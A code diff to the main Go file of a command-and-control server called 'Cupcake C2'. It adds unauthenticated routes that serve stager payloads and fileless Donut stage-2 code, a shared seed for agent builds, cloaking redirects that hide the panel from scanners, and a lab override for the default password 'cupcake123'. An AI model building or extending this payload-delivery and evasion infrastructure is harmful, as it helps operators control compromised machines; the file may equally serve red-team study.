@@ -1,12 +1,17 @@
 package main
 
 import (
+	"context"
+	"crypto/tls"
 	"embed"
 	"fmt"
 	"io/fs"
 	"log"
 	"net/http"
+	"os"
+	"os/signal"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/gin-contrib/cors"
@@ -15,8 +20,12 @@ import (
 	"cupcake-server/controllers"
 	"cupcake-server/pkg/config"
 	"cupcake-server/pkg/globals"
+	"cupcake-server/pkg/logx"
 	"cupcake-server/pkg/middleware"
+	"cupcake-server/pkg/model"
+	"cupcake-server/pkg/paths"
 	"cupcake-server/pkg/store"
+	"cupcake-server/pkg/utils"
 	"cupcake-server/services"
 )
 
@@ -28,11 +37,29 @@ func main() {
 	if err != nil {
 		log.Fatalf("Failed to load config: %v", err)
 	}
+	if cfg.DataDir != "" {
+		_ = os.Setenv("CUPCAKE_DATA_DIR", cfg.DataDir)
+	}
+	paths.Init()
 
 	store.InitDB()
+	// Wire seed: env CUPCAKE_WIRE_SEED overrides; else setting; else default (matches Client build.rs)
+	wireSeed := strings.TrimSpace(os.Getenv("CUPCAKE_WIRE_SEED"))
+	if wireSeed == "" {
+		wireSeed = strings.TrimSpace(store.GetSetting("wire_seed"))
+	}
+	if wireSeed == "" {
+		wireSeed = utils.DefaultWireSeed
+		_ = store.SetSetting("wire_seed", wireSeed, "crypto")
+	}
+	utils.SetWireSeed(wireSeed)
+	_ = os.Setenv("CUPCAKE_WIRE_SEED", wireSeed)
+
 	store.ResetAllAgentsOffline()
+	bootstrapAdminPassword(cfg)
 	go services.RestoreListeners()
 	go services.RestoreTunnels()
+	services.StartAgentHealthMonitor(time.Duration(cfg.AgentStaleSecs) * time.Second)
 
 	gin.SetMode(gin.ReleaseMode)
 	adminRouter := gin.New()
@@ -71,6 +98,9 @@ func main() {
 	// 🚀 Public routes (no auth required) - Stager payload delivery
 	adminRouter.GET("/api/s/bin/:id", controllers.HandleServeRawPayload)
 	adminRouter.GET("/api/s/:id", controllers.HandleServePayload)
+	// Fileless Stage2 PIC (Donut) — short-TTL cache from /api/stager?delivery=fileless
+	adminRouter.GET("/api/stage2/:id", controllers.HandleServeStage2)
+	adminRouter.GET("/api/s/stage2/:id", controllers.HandleServeStage2)
 
 	api := adminRouter.Group("/api")
 	{
@@ -168,7 +198,7 @@ func main() {
 		api.GET("/payloads/:filename", controllers.HandleServeProtectedPayload)
 
 		api.POST("/auth/login", controllers.HandleLogin)
-		api.POST("/auth/logout", func(c *gin.Context) { c.JSON(200, gin.H{"msg": "logged out"}) })
+		api.POST("/auth/logout", controllers.HandleLogout)
 		api.POST("/maintenance/reset", controllers.HandleMaintenanceReset)
 		api.GET("/maintenance/export", controllers.HandleMaintenanceExport)
 		api.POST("/maintenance/update_templates", controllers.HandleUpdateTemplates)
@@ -188,34 +218,17 @@ func main() {
 			return
 		}
 
-		// 2. OpSec Layer: HTTP Basic Auth for Web UI (The "Nginx Style" Lock)
-		user, password, hasAuth := c.Request.BasicAuth()
-		secretUser := store.GetSetting("web_auth_user")
-		secretPass := store.GetSetting("web_auth_password")
-
-		// Default credentials if not yet set in DB
-		if secretUser == "" { secretUser = "admin" }
-		if secretPass == "" { secretPass = "cupcake123" }
-
-		if !hasAuth || user != secretUser || password != secretPass {
-			// Trigger browser login popup
-			c.Writer.Header().Set("WWW-Authenticate", `Basic realm="Restricted Content"`)
-			c.Status(http.StatusUnauthorized)
-			// Return blank page for scanners
-			c.Writer.Write([]byte("")) 
-			c.Abort()
-			return
-		}
-
-		// 3. For non-API routes when authorized, handle Cloaking (if path is weird)
+		// 2. Optional cloak redirect for non-root paths (no Basic Auth popup)
 		if cloakTarget != "" && path != "/" && path != "/index.html" && !strings.Contains(path, "assets") {
 			c.Redirect(http.StatusFound, cloakTarget)
 			return
 		}
 
-		// 4. Serve Static Files (Vue UI)
+		// 3. Serve Vue SPA / static assets — login is panel form (POST /api/auth/login)
 		cleanPath := strings.TrimPrefix(path, "/")
-		if cleanPath == "" { cleanPath = "index.html" }
+		if cleanPath == "" {
+			cleanPath = "index.html"
+		}
 		f, err := distFS.Open(cleanPath)
 		if err == nil {
 			f.Close()
@@ -224,7 +237,11 @@ func main() {
 		}
 
 		// SPA Fallback
-		index, _ := distFS.Open("index.html")
+		index, err := distFS.Open("index.html")
+		if err != nil {
+			c.Status(http.StatusNotFound)
+			return
+		}
 		defer index.Close()
 		stat, _ := index.Stat()
 		c.DataFromReader(200, stat.Size(), "text/html; charset=utf-8", index, nil)
@@ -241,20 +258,28 @@ func main() {
                           >> BY Timao <<
 `
 	fmt.Println("\x1b[35m" + banner + "\x1b[0m")
-	fmt.Println("\x1b[36mCupcake C2 控制终端\x1b[0m")
-	fmt.Printf("\x1b[32m[+]\x1b[0m Web UI: http://127.0.0.1:%d\n", cfg.AdminPort)
+	fmt.Println("\x1b[36mC2 control plane\x1b[0m")
+	scheme := "http"
+	if cfg.AdminTLS {
+		scheme = "https"
+	}
+	fmt.Printf("\x1b[32m[+]\x1b[0m Web UI: %s://%s:%d (bind %s)\n", scheme, cfg.AdminBind, cfg.AdminPort, cfg.AdminBind)
+	if cfg.AdminBind == "0.0.0.0" || cfg.AdminBind == "::" {
+		fmt.Printf("\x1b[33m[!]\x1b[0m Admin bind is public — use reverse proxy / IP allowlist; prefer 127.0.0.1 for lab\n")
+	}
 	fmt.Println("-----------------------------------------")
-	fmt.Printf("\x1b[32m[+]\x1b[0m 默认账户: admin\n")
-	fmt.Printf("\x1b[32m[+]\x1b[0m 默认密码: cupcake123\n")
+	fmt.Printf("\x1b[32m[+]\x1b[0m Panel form login (no Basic Auth popup); 5 fails → 5 min lock / IP\n")
+	fmt.Printf("\x1b[32m[+]\x1b[0m Wire seed: %s (agent builds must use same CUPCAKE_WIRE_SEED)\n", wireSeed)
 	mcpToken := store.GetSetting("system_api_token")
 	if mcpToken != "" {
 		fmt.Printf("\x1b[32m[+]\x1b[0m MCP API Key: %s\n", mcpToken)
 	}
 	fmt.Println("-----------------------------------------")
+	logx.Info("admin server starting", "bind", cfg.AdminBind, "port", cfg.AdminPort, "tls", cfg.AdminTLS)
 
 	// Display active listeners after they restore
 	go func() {
-		time.Sleep(2 * time.Second) // Wait for RestoreListeners to finish
+		time.Sleep(2 * time.Second)
 		var activePorts []string
 		globals.Listeners.Range(func(key, value interface{}) bool {
 			ln := value.(*globals.Listener)
@@ -273,7 +298,94 @@ func main() {
 		}
 	}()
 
-	if err := adminRouter.Run(fmt.Sprintf(":%d", cfg.AdminPort)); err != nil {
-		log.Fatal(err)
+	addr := fmt.Sprintf("%s:%d", cfg.AdminBind, cfg.AdminPort)
+	srv := &http.Server{Addr: addr, Handler: adminRouter}
+
+	if cfg.AdminTLS {
+		var cert tls.Certificate
+		var cerr error
+		if cfg.AdminTLSCert != "" && cfg.AdminTLSKey != "" {
+			cert, cerr = tls.LoadX509KeyPair(cfg.AdminTLSCert, cfg.AdminTLSKey)
+		} else if cfg.AdminTLSAuto {
+			cert, cerr = utils.GenerateSelfSignedCert([]string{"localhost", "127.0.0.1"})
+		} else {
+			log.Fatal("admin_tls=true requires admin_tls_cert/key or admin_tls_auto=true")
+		}
+		if cerr != nil {
+			log.Fatalf("admin TLS cert: %v", cerr)
+		}
+		srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
 	}
+
+	go func() {
+		var err error
+		if cfg.AdminTLS {
+			err = srv.ListenAndServeTLS("", "")
+		} else {
+			err = srv.ListenAndServe()
+		}
+		if err != nil && err != http.ErrServerClosed {
+			log.Fatalf("admin server: %v", err)
+		}
+	}()
+
+	// Graceful shutdown
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
+	sig := <-sigCh
+	logx.Info("shutdown signal", "signal", sig.String())
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	_ = srv.Shutdown(ctx)
+	// Stop listeners best-effort
+	globals.Listeners.Range(func(key, value interface{}) bool {
+		if ln, ok := value.(*globals.Listener); ok {
+			services.StopListenerInstance(ln)
+		}
+		return true
+	})
+	logx.Info("admin server stopped")
+}
+
+// bootstrapAdminPassword ensures an admin user exists.
+// Priority: config.AdminPass → existing DB hash → generate random (printed once).
+// Set CUPCAKE_FORCE_DEV_PASS=1 to force admin/cupcake123 for lab only.
+func bootstrapAdminPassword(cfg *config.ServerConfig) {
+	const fixedUser = "admin"
+	pass := strings.TrimSpace(cfg.AdminPass)
+	forceDev := os.Getenv("CUPCAKE_FORCE_DEV_PASS") == "1" || os.Getenv("CUPCAKE_FORCE_DEV_PASS") == "true"
+	if forceDev {
+		pass = "cupcake123"
+	}
+
+	user, err := store.GetUserByUsername(fixedUser)
+	if err != nil || user == nil {
+		if pass == "" {
+			// 20-char random alnum
+			pass, _ = utils.RandomAlphaString(20)
+			fmt.Printf("\x1b[33m[!]\x1b[0m Generated admin password (save it): %s\n", pass)
+		}
+		hashed, _ := store.HashPassword(pass)
+		_ = store.SaveUser(&model.User{
+			Username: fixedUser,
+			Password: hashed,
+			Role:     "admin",
+			IsActive: true,
+		})
+		store.SetSetting("web_auth_user", fixedUser, "security")
+		// Do not store plaintext password in settings in production; only for form-compat path
+		if forceDev {
+			store.SetSetting("web_auth_password", pass, "security")
+		}
+		fmt.Printf("\x1b[32m[+]\x1b[0m Created admin user %q\n", fixedUser)
+		return
+	}
+	if forceDev && pass != "" && !store.CheckPasswordHash(pass, user.Password) {
+		hashed, _ := store.HashPassword(pass)
+		user.Password = hashed
+		_ = store.SaveUser(user)
+		store.SetSetting("web_auth_password", pass, "security")
+		fmt.Printf("\x1b[33m[!]\x1b[0m Forced lab password via CUPCAKE_FORCE_DEV_PASS\n")
+	}
+	store.SetSetting("web_auth_user", fixedUser, "security")
 }
